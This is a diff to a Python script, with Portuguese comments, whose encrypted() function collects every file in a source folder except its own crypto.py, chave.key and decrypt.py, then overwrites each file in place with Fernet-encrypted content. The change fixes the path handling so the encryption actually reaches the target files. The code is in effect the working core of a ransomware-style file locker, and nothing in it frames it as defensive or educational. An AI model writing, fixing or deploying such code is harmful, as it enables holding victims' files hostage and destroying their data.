@@ -17,13 +17,13 @@ def encrypted():
         print(file)
         if file == "crypto.py" or file == "chave.key" or file == "decrypt.py":
             continue
-        if os.path.isfile(file):
+        if os.path.isfile(os.path.join(origem, file)):  # Corrigido aqui
             print(file)
-            files.append(file)
-    print (files)
+            files.append(os.path.join(origem, file))  # Corrigido aqui
+    print(files)
 
     for file in files:
-        with open(file,"rb") as arquivo:
+        with open(file, "rb") as arquivo:
             conteudo = arquivo.read()
         conteudo_encrypted = Fernet(key).encrypt(conteudo)
         with open(file, "wb") as arquivo:
